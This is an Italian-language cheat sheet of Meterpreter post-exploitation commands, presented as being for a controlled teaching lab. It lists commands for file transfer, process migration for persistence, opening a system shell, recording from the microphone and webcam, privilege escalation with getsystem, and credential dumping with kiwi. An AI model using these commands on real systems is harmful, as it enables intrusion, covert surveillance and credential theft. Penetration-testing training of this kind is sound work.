# 📌 Comandi Utili in Meterpreter

Una volta stabilita la sessione, Meterpreter offre numerose funzionalità avanzate per l’analisi e il controllo remoto della macchina del laboratorio.

Di seguito una lista dei comandi più utili **in ambiente controllato e didattico**.

---

## 🔹 Informazioni di sistema

```bash
sysinfo
```

Mostra informazioni sul sistema operativo, architettura e nome macchina.

```bash
getuid
```

Mostra l’utente attualmente impersonato.

---

## 🔹 Navigazione nel file system

```bash
ls
pwd
cd <cartella>
```

```bash
cat <file>
download <file>
upload <file>
```

---

## 🔹 Gestione processi

```bash
ps
```

Mostra tutti i processi attivi.

```bash
kill <PID>
migrate <PID>
```

Permette di uccidere o migrare a un processo differente (utile per persistenza o stabilità).

---

## 🔹 Network

```bash
ipconfig
route
netstat
```

---

## 🔹 Shell di sistema

```bash
shell
```

Apre una shell CMD/PowerShell direttamente dalla sessione Meterpreter.

---

## 🔹 Screenshot e Desktop remoto

```bash
screenshot
```

```bash
record_mic
webcam_snap
webcam_stream
```

---

## 🔹 Escalation di privilegi

```bash
getsystem
```

Tenta varie tecniche automatiche di privilege escalation.

---

## 🔹 Moduli di post-exploitation

Lista dei moduli disponibili:

```bash
run post
```

Esempio di raccolta credenziali (in LAN didattica e controllata):

```bash
load kiwi
kiwi_cmd "creds_all"
```

---

## 🔹 Gestione sessioni

```bash
background
sessions
sessions -i <ID>
```

---

## 🔹 Uscita

```bash
exit
```

---
